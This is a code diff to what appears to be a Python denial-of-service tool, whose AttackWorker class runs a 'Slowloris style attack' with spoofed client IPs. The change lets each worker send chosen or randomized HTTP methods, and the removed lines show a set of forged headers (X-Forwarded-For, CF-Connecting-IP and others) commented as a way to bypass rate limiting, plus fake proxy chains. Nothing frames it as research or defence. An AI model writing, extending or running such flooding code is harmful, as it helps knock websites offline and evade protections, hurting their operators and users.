@@ -13,6 +13,7 @@ from typing import Optional
 
 from .statistics import AttackStatistics
 from .ip_generator import IPGenerator
+from .http_methods import HTTPMethodBuilder, HTTPMethod
 from ..config import USER_AGENTS, DEFAULT_TIMEOUT, DEFAULT_KEEP_ALIVE_INTERVAL
 
 class AttackWorker:
@@ -24,7 +25,9 @@ class AttackWorker:
         target_port: int, 
         stats: AttackStatistics, 
         worker_id: int, 
-        use_spoofing: bool = True, 
+        use_spoofing: bool = True,
+        http_method: Optional[HTTPMethod] = None,
+        randomize_method: bool = False,
         timeout: int = DEFAULT_TIMEOUT, 
         keep_alive_interval: int = DEFAULT_KEEP_ALIVE_INTERVAL
     ):
@@ -37,6 +40,8 @@ class AttackWorker:
             stats: Statistics tracker instance
             worker_id: Unique worker ID
             use_spoofing: Enable IP spoofing
+            http_method: Specific HTTP method to use (None = GET)
+            randomize_method: Use random HTTP method for each request
             timeout: Socket timeout
             keep_alive_interval: Interval between garbage headers
         """
@@ -45,6 +50,8 @@ class AttackWorker:
         self.stats = stats
         self.worker_id = worker_id
         self.use_spoofing = use_spoofing
+        self.http_method = http_method or HTTPMethod.GET
+        self.randomize_method = randomize_method
         self.timeout = timeout
         self.keep_alive_interval = keep_alive_interval
         self.running = True
@@ -55,7 +62,7 @@ class AttackWorker:
         
     def build_http_request(self, spoofed_ip: Optional[str]) -> str:
         """
-        Xây dựng HTTP request với đầy đủ bypass headers
+        Xây dựng HTTP request với method được chọn
         
         Args:
             spoofed_ip: IP to spoof (None if spoofing disabled)
@@ -63,45 +70,37 @@ class AttackWorker:
         Returns:
             Complete HTTP request string
         """
-        rand_param = random.randint(1, 999999)
         user_agent = random.choice(USER_AGENTS)
+        rand_param = random.randint(1, 999999)
+        path = f"/?storm={rand_param}"
         
-        # Base request
-        request = (
-            f"GET /?storm={rand_param} HTTP/1.1\r\n"
-            f"Host: {self.target_ip}\r\n"
-            f"User-Agent: {user_agent}\r\n"
-        )
-        
-        # Thêm spoofing headers nếu được bật
-        if self.use_spoofing and spoofed_ip:
-            # Các header phổ biến để bypass rate limiting
-            request += (
-                f"X-Forwarded-For: {spoofed_ip}\r\n"      # Nginx, Apache
-                f"X-Real-IP: {spoofed_ip}\r\n"            # Nginx
-                f"X-Client-IP: {spoofed_ip}\r\n"          # Generic
-                f"X-Originating-IP: {spoofed_ip}\r\n"    # Some proxies
-                f"Client-IP: {spoofed_ip}\r\n"            # IIS
-                f"True-Client-IP: {spoofed_ip}\r\n"       # Cloudflare
-                f"CF-Connecting-IP: {spoofed_ip}\r\n"    # Cloudflare
-                f"X-ProxyUser-IP: {spoofed_ip}\r\n"       # Generic proxy
+        # Choose method
+        if self.randomize_method:
+            # Random method each time
+            return HTTPMethodBuilder.build_random(
+                self.target_ip,
+                path,
+                user_agent,
+                spoofed_ip
             )
+        else:
+            # Use specific method
+            method_map = {
+                HTTPMethod.GET: HTTPMethodBuilder.build_get,
+                HTTPMethod.POST: HTTPMethodBuilder.build_post,
+                HTTPMethod.HEAD: HTTPMethodBuilder.build_head,
+                HTTPMethod.OPTIONS: HTTPMethodBuilder.build_options,
+                HTTPMethod.PUT: HTTPMethodBuilder.build_put,
+                HTTPMethod.DELETE: HTTPMethodBuilder.build_delete,
+            }
             
-            # Via header với proxy chain giả
-            via_chain = IPGenerator.generate_proxy_chain()
-            request += f"Via: {via_chain}\r\n"
-        
-        # Standard headers
-        request += (
-            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-            f"Accept-Language: en-US,en;q=0.5\r\n"
-            f"Accept-Encoding: gzip, deflate\r\n"
-            f"Connection: keep-alive\r\n"
-            f"Keep-Alive: timeout=300, max=1000\r\n"
-            f"Cache-Control: max-age=0\r\n"
-        )
-        
-        return request
+            builder = method_map.get(self.http_method, HTTPMethodBuilder.build_get)
+            return builder(
+                self.target_ip,
+                path,
+                user_agent,
+                spoofed_ip
+            )
         
     def run(self):
         """Main worker loop - Slowloris style attack với IP spoofing"""
